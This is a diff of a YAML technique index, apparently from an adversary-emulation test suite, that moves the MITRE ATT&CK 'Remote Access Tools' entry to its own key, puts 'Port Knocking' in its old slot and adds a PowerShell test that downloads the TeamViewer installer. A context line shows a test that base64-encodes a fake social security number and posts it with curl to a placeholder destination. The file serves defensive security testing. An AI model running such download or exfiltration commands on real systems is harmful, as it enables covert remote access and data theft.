@@ -26860,59 +26860,57 @@ command-and-control:
   '':
     technique:
       x_mitre_data_sources:
-      - Network intrusion detection system
-      - Network protocol analysis
-      - Process use of network
-      - Process monitoring
+      - Packet capture
+      - Netflow/Enclave netflow
       x_mitre_permissions_required:
       - User
-      name: Remote Access Tools
-      description: |-
-        An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be whitelisted within a target environment. Remote access tools like VNC, Ammy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)
-
-        Remote access tools may be established and used post-compromise as alternate communications channel for [Redundant Access](https://attack.mitre.org/techniques/T1108) or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary controlled system.
-
-        Admin tools such as TeamViewer have been used by several groups targeting institutions in countries of interest to the Russian state and criminal campaigns. (Citation: CrowdStrike 2015 Global Threat Report) (Citation: CrySyS Blog TeamSpy)
-      id: attack-pattern--4061e78c-1284-44b4-9116-73e4ac3912f7
-      x_mitre_contributors:
-      - Matt Kelly, @breakersall
+      name: Port Knocking
+      description: "Port Knocking is a well-established method used by both defenders
+        and adversaries to hide open ports from access. To enable a port, an adversary
+        sends a series of packets with certain characteristics before the port will
+        be opened. Usually this series of packets consists of attempted connections
+        to a predefined sequence of closed ports, but can involve unusual flags, specific
+        strings or other unique characteristics. After the sequence is completed,
+        opening a port is often accomplished by the host based firewall, but could
+        also be implemented by custom software. \n\nThis technique has been observed
+        to both for the dynamic opening of a listening port as well as the initiating
+        of a connection to a listening server on a different system.\n\nThe observation
+        of the signal packets to trigger the communication can be conducted through
+        different methods. One means, originally implemented by Cd00r (Citation: Hartrell
+        cd00r 2002), is to use the libpcap libraries to sniff for the packets in question.
+        Another method leverages raw sockets, which enables the malware to use ports
+        that are already open for use by other programs."
+      id: attack-pattern--451a9977-d255-43c9-b431-66de80130c8c
+      modified: '2019-07-18T17:11:15.521Z'
       x_mitre_platforms:
       - Linux
-      - Windows
       - macOS
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
-      x_mitre_version: '1.0'
+      x_mitre_version: '1.1'
       type: attack-pattern
-      x_mitre_detection: |-
-        Monitor for applications and processes related to remote admin tools. Correlate activity with other suspicious behavior that may reduce false positives if these tools are used by legitimate users and administrators.
-
-        Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.
-
-        [Domain Fronting](https://attack.mitre.org/techniques/T1172) may be used in conjunction to avoid defenses. Adversaries will likely need to deploy and/or install these remote tools to compromised systems. It may be possible to detect or prevent the installation of these tools with host-based solutions.
+      x_mitre_detection: Record network packets sent to and from the system, looking
+        for extraneous packets that do not belong to established flows.
       created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
       x_mitre_network_requirements: true
       created: '2018-04-18T17:59:24.739Z'
       kill_chain_phases:
       - kill_chain_name: mitre-attack
+        phase_name: defense-evasion
+      - kill_chain_name: mitre-attack
+        phase_name: persistence
+      - kill_chain_name: mitre-attack
         phase_name: command-and-control
       external_references:
-      - external_id: T1219
+      - external_id: T1205
         source_name: mitre-attack
-        url: https://attack.mitre.org/techniques/T1219
-      - source_name: Symantec Living off the Land
-        description: Wueest, C., Anand, H. (2017, July). Living off the land and fileless
-          attack techniques. Retrieved April 10, 2018.
-        url: https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/istr-living-off-the-land-and-fileless-attack-techniques-en.pdf
-      - source_name: CrowdStrike 2015 Global Threat Report
-        description: CrowdStrike Intelligence. (2016). 2015 Global Threat Report.
-          Retrieved April 11, 2018.
-        url: https://go.crowdstrike.com/rs/281-OBQ-266/images/15GlobalThreatReport.pdf
-      - source_name: CrySyS Blog TeamSpy
-        description: CrySyS Lab. (2013, March 20). TeamSpy – Obshie manevri. Ispolzovat’
-          tolko s razreshenija S-a. Retrieved April 11, 2018.
-        url: https://blog.crysys.hu/2013/03/teamspy/
-      modified: '2019-07-18T17:42:08.766Z'
+        url: https://attack.mitre.org/techniques/T1205
+      - source_name: Hartrell cd00r 2002
+        description: 'Hartrell, Greg. (2002, August). Get a handle on cd00r: The invisible
+          backdoor. Retrieved October 13, 2018.'
+        url: https://www.giac.org/paper/gcih/342/handle-cd00r-invisible-backdoor/103631
+      x_mitre_defense_bypassed:
+      - Defensive network service scanning
     atomic_tests: []
   T1090:
     technique:
@@ -27104,6 +27102,75 @@ command-and-control:
         command: |
           echo -n 111-11-1111 | base64
           curl -XPOST #{base64_data}.#{destination_url}
+  T1219:
+    technique:
+      x_mitre_data_sources:
+      - Network intrusion detection system
+      - Network protocol analysis
+      - Process use of network
+      - Process monitoring
+      x_mitre_permissions_required:
+      - User
+      name: Remote Access Tools
+      description: |-
+        An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be whitelisted within a target environment. Remote access tools like VNC, Ammy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)
+
+        Remote access tools may be established and used post-compromise as alternate communications channel for [Redundant Access](https://attack.mitre.org/techniques/T1108) or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary controlled system.
+
+        Admin tools such as TeamViewer have been used by several groups targeting institutions in countries of interest to the Russian state and criminal campaigns. (Citation: CrowdStrike 2015 Global Threat Report) (Citation: CrySyS Blog TeamSpy)
+      id: attack-pattern--4061e78c-1284-44b4-9116-73e4ac3912f7
+      x_mitre_contributors:
+      - Matt Kelly, @breakersall
+      x_mitre_platforms:
+      - Linux
+      - Windows
+      - macOS
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      type: attack-pattern
+      x_mitre_detection: |-
+        Monitor for applications and processes related to remote admin tools. Correlate activity with other suspicious behavior that may reduce false positives if these tools are used by legitimate users and administrators.
+
+        Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.
+
+        [Domain Fronting](https://attack.mitre.org/techniques/T1172) may be used in conjunction to avoid defenses. Adversaries will likely need to deploy and/or install these remote tools to compromised systems. It may be possible to detect or prevent the installation of these tools with host-based solutions.
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      x_mitre_network_requirements: true
+      created: '2018-04-18T17:59:24.739Z'
+      kill_chain_phases:
+      - kill_chain_name: mitre-attack
+        phase_name: command-and-control
+      external_references:
+      - external_id: T1219
+        source_name: mitre-attack
+        url: https://attack.mitre.org/techniques/T1219
+      - source_name: Symantec Living off the Land
+        description: Wueest, C., Anand, H. (2017, July). Living off the land and fileless
+          attack techniques. Retrieved April 10, 2018.
+        url: https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/istr-living-off-the-land-and-fileless-attack-techniques-en.pdf
+      - source_name: CrowdStrike 2015 Global Threat Report
+        description: CrowdStrike Intelligence. (2016). 2015 Global Threat Report.
+          Retrieved April 11, 2018.
+        url: https://go.crowdstrike.com/rs/281-OBQ-266/images/15GlobalThreatReport.pdf
+      - source_name: CrySyS Blog TeamSpy
+        description: CrySyS Lab. (2013, March 20). TeamSpy – Obshie manevri. Ispolzovat’
+          tolko s razreshenija S-a. Retrieved April 11, 2018.
+        url: https://blog.crysys.hu/2013/03/teamspy/
+      modified: '2019-07-18T17:42:08.766Z'
+      identifier: T1219
+    atomic_tests:
+    - name: TeamViewer Files Detected Test on Windows
+      description: "An adversary may attempt to trick the user into downloading teamviewer
+        and using  this to maintain access to the machine. \n"
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $client = new-object System.Net.WebClient
+          $client.DownloadFile("https://download.teamviewer.com/download/TeamViewer_Setup.exe","C:\tmp\teamviewer.exe")
   T1105:
     technique:
       x_mitre_data_sources:
